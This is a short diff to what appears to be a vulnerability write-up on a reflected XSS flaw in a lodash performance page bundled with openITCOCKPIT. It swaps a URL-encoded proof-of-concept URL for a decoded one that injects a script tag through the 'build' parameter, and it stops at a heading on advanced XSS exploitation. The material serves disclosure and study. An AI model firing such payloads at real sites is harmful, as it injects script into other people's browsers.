@@ -230,6 +230,6 @@ The `ui.buildPath` is set near the bottom of the file. A `switch` returns the va
 
 #### Proof of Concept (PoC):
 ```text
-https://openitcockpit/js/vendor/lodash/perf/index.html?build=%22%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
+https://openitcockpit/js/vendor/lodash/perf/index.html?build="></script><script>alert(1)</script>
 ```
 ## Advanced XSS Exploitation
